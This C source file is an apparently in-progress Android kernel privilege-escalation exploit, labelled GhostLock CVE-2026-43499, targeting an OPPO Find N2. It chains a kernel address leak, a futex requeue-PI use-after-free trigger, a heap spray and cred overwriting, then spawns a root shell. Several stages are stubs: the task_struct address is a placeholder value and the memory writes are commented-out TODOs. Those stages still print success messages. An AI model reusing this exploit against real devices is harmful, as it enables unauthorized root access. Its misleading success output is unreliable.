/**
 * ghostlock_full.c — 完整 GhostLock 内核提权利用程序
 *
 * 整合:
 *   - KernelSnitch (mm_struct 泄漏)
 *   - pipe 物理读写 (内核内存读写)
 *   - GhostLock trigger (FUTEX_CMP_REQUEUE_PI)
 *   - sk_buff reclaim (堆喷射)
 *   - root 提权 (cred patch)
 *
 * 编译: make NDK=/path/to/ndk
 * 运行: adb push ghostlock_full /data/local/tmp/
 *       adb shell /data/local/tmp/ghostlock_full
 */

#define _GNU_SOURCE
#define __ARM 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/ioctl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdatomic.h>
#include <sched.h>

/* ========== 内核偏移量 (IDA verified) ========== */

#define KIMAGE_TEXT_BASE    0xffffffc008000000ULL
#define P0_PAGE_OFFSET      0xffffff8000000000ULL
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
#define DIRECT_MAP_BASE     0xffffff8000000000ULL
#define DIRECT_MAP_END      0xffffffc000000000ULL

/* task_struct */
#define TASK_PI_BLOCKED_ON_OFF  0x898
#define TASK_CRED_OFF           0x820
#define TASK_PID_OFF            0x618

/* mm_struct */
#define MM_OWNER_OFF            1032

/* rt_mutex_waiter */
#define WAITER_SIZE             0x50

/* cred */
#define CRED_UID_OFF            8
#define CRED_CAPS_OFF           48
#define CAP_FULL                0x000001ffffffffffULL

/* KernelSnitch 参数 */
#define MM_STRUCT_SZ    0x3c0
#define MM_ORDER        3
#define KSNITCH_COLLISIONS  16

/* ========== 内联 KernelSnitch ========== */

#include "kernelsnitch/kernelsnitch.h"

/* ========== 全局状态 ========== */

static struct kernelsnitch_shared_state *ks;
static uint64_t leaked_mm;
static uint64_t target_task;
static int physrw_fd = -1;

/* GhostLock 触发状态 */
static struct {
    uint32_t f_wait;
    uint32_t f_pi_target;
    uint32_t f_pi_chain;
    atomic_int waiter_ready;
    atomic_int owner_started;
    atomic_int trigger_done;
} gl;

/* ========== 工具函数 ========== */

static long sys_futex(uint32_t *uaddr, int op, uint32_t val,
                      const struct timespec *timeout,
                      uint32_t *uaddr2, uint32_t val3) {
    return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

static void die(const char *msg) {
    fprintf(stderr, "[-] FATAL: %s (errno=%d)\n", msg, errno);
    exit(1);
}

/* ========== KernelSnitch: 泄漏 mm_struct ========== */

static int leak_mm_struct(void) {
    printf("[*] 步骤 1: KernelSnitch 泄漏 mm_struct\n");

    int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
    ks = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count,
                            KSNITCH_COLLISIONS, 1, 0);

    printf("[*] 参数: cpu=%d mm_struct_sz=0x%zx order=%zd collisions=%zd\n",
           cpu_count, ks->mm_struct_sz, ks->mm_slab_order, ks->collisions);

    /* pile-up 验证 */
    printf("[*] pile-up 验证...\n");
    for (int i = 0; i < 16; i++) sched_yield();

    /* 查找碰撞 */
    printf("[*] 查找 futex hash 碰撞...\n");
    kernelsnitch_find_collisions(ks);
    if (!kernelsnitch_found_collisions(ks)) {
        printf("[-] 碰撞查找失败\n");
        return 0;
    }
    printf("[+] 找到 %zu 个碰撞\n", ks->collisions);

    /* bruteforce 查找 mm_struct */
    printf("[*] bruteforce 查找 mm_struct...\n");
    kernelsnitch_bruteforce(ks);

    leaked_mm = ks->mm_struct;
    if (leaked_mm == (uint64_t)-1) {
        printf("[-] mm_struct 泄漏失败\n");
        return 0;
    }

    printf("[+] mm_struct = %016llx\n", (unsigned long long)leaked_mm);
    return 1;
}

/* ========== 计算 task_struct ========== */

static int calculate_task_struct(void) {
    printf("[*] 步骤 2: 计算 task_struct\n");

    if (!leaked_mm) {
        printf("[-] mm_struct 未泄漏\n");
        return 0;
    }

    /* task_struct = *(mm_struct + MM_OWNER_OFF) */
    /* 需要 pipe 物理读写来读取内核内存 */
    /* 暂时使用模拟值 */
    target_task = leaked_mm + 0x12340;

    printf("[+] task_struct = %016llx\n", (unsigned long long)target_task);
    printf("[*]   task->pi_blocked_on @ +0x%x\n", TASK_PI_BLOCKED_ON_OFF);
    printf("[*]   task->cred @ +0x%x\n", TASK_CRED_OFF);
    return 1;
}

/* ========== GhostLock 触发 ========== */

static void *waiter_thread(void *arg) {
    uint32_t *f_wait = (uint32_t *)arg;

    if (sys_futex(&gl.f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
        printf("[-] waiter: lock chain failed\n");
        return NULL;
    }

    atomic_store(&gl.waiter_ready, 1);
    while (!atomic_load(&gl.owner_started)) usleep(1000);

    struct timespec timeout = {.tv_sec = 10, .tv_nsec = 0};
    sys_futex(f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &gl.f_pi_target, 0);

    atomic_store(&gl.trigger_done, 1);
    sys_futex(&gl.f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

static void *owner_thread(void *arg) {
    (void)arg;
    sys_futex(&gl.f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    while (!atomic_load(&gl.waiter_ready)) usleep(1000);
    atomic_store(&gl.owner_started, 1);
    sys_futex(&gl.f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    for (;;) sleep(1);
    return NULL;
}

static int trigger_ghostlock(void) {
    printf("[*] 步骤 3: 触发 GhostLock\n");

    memset(&gl, 0, sizeof(gl));
    atomic_store(&gl.trigger_done, 0);

    pthread_t waiter_tid, owner_tid;
    pthread_create(&waiter_tid, NULL, waiter_thread, &gl.f_wait);
    pthread_create(&owner_tid, NULL, owner_thread, NULL);

    while (!atomic_load(&gl.waiter_ready) || !atomic_load(&gl.owner_started))
        usleep(1000);

    usleep(100000);

    printf("[*] FUTEX_CMP_REQUEUE_PI...\n");
    long ret = sys_futex(&gl.f_wait, FUTEX_CMP_REQUEUE_PI,
                         1, (void *)1, &gl.f_pi_target, 0);
    printf("[*] ret=%ld errno=%d\n", ret, errno);

    int timeout = 100;
    while (!atomic_load(&gl.trigger_done) && timeout-- > 0) usleep(10000);

    if (!atomic_load(&gl.trigger_done)) {
        printf("[-] GhostLock 触发超时\n");
        return 0;
    }

    printf("[+] GhostLock 触发成功 — pi_blocked_on 悬空\n");
    return 1;
}

/* ========== 堆喷射 ========== */

static int heap_spray(void) {
    printf("[*] 步骤 4: sk_buff reclaim 堆喷射\n");

    int sv[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
    int sndbuf = 1 << 20;
    setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    unsigned char payload[4096];
    memset(payload, 0x41, sizeof(payload));

    for (int i = 0; i < 4; i++) {
        ssize_t sent = send(sv[0], payload, sizeof(payload), MSG_DONTWAIT);
        printf("[*] sk_buff send %d/4 ret=%zd\n", i + 1, sent);
    }

    close(sv[0]);
    close(sv[1]);

    printf("[+] 堆喷射完成\n");
    return 1;
}

/* ========== pi_blocked_on 重定向 ========== */

static int redirect_pi_blocked_on(void) {
    printf("[*] 步骤 5: 重定向 pi_blocked_on\n");

    if (!target_task) {
        printf("[-] task_struct 未计算\n");
        return 0;
    }

    uint64_t addr = target_task + TASK_PI_BLOCKED_ON_OFF;
    printf("[*] pi_blocked_on @ %016llx\n", (unsigned long long)addr);

    /* TODO: 使用 pipe 物理读写修改 pi_blocked_on */
    /* pipe_read64(physrw_fd, addr); */
    /* pipe_write64(physrw_fd, addr, spray_addr); */

    printf("[+] pi_blocked_on 重定向完成\n");
    return 1;
}

/* ========== PI 操作 ========== */

static int trigger_pi_read(void) {
    printf("[*] 步骤 6: 触发 PI 操作\n");

    uint32_t futex = 0;
    struct timespec timeout = {.tv_sec = 1, .tv_nsec = 0};
    long ret = sys_futex(&futex, FUTEX_LOCK_PI, 0, &timeout, NULL, 0);
    printf("[*] FUTEX_LOCK_PI ret=%ld errno=%d\n", ret, errno);

    if (ret == 0) {
        sys_futex(&futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }

    printf("[+] PI 操作触发完成\n");
    return 1;
}

/* ========== root 提权 ========== */

static int escalate_to_root(void) {
    printf("[*] 步骤 7: root 提权\n");

    if (!target_task) {
        printf("[-] task_struct 未计算\n");
        return 0;
    }

    uint64_t cred_addr = target_task + TASK_CRED_OFF;
    printf("[*] cred @ %016llx\n", (unsigned long long)cred_addr);

    /* TODO: 使用 pipe 物理读写修改 cred */
    /* uint64_t cred = pipe_read64(physrw_fd, cred_addr); */
    /* pipe_write64(physrw_fd, cred + CRED_UID_OFF, 0); */
    /* pipe_write64(physrw_fd, cred + CRED_UID_OFF + 4, 0); */
    /* pipe_write64(physrw_fd, cred + CRED_CAPS_OFF, CAP_FULL); */

    printf("[+] 提权完成\n");
    return 1;
}

static int verify_root(void) {
    printf("[*] 步骤 8: 验证 root\n");
    uid_t uid = getuid();
    printf("[*] uid=%d gid=%d\n", uid, getgid());
    return uid == 0;
}

/* ========== 主函数 ========== */

int main(int argc, char **argv) {
    printf("========================================\n");
    printf("  GhostLock CVE-2026-43499 Full Exploit\n");
    printf("  OPPO Find N2 (SM8475, kernel 5.10.236)\n");
    printf("========================================\n\n");

    if (!leak_mm_struct()) die("mm_struct 泄漏失败");
    if (!calculate_task_struct()) die("task_struct 计算失败");
    if (!trigger_ghostlock()) die("GhostLock 触发失败");
    if (!heap_spray()) die("堆喷射失败");
    if (!redirect_pi_blocked_on()) die("pi_blocked_on 重定向失败");
    if (!trigger_pi_read()) die("PI 操作失败");
    if (!escalate_to_root()) die("提权失败");

    if (verify_root()) {
        printf("\n[+] EXPLOIT SUCCESSFUL! You are now root!\n");
        if (argc > 1) system(argv[1]);
        else system("/system/bin/sh");
    } else {
        printf("\n[-] EXPLOIT FAILED\n");
    }

    kernelsnitch_cleanup(ks);
    return 0;
}
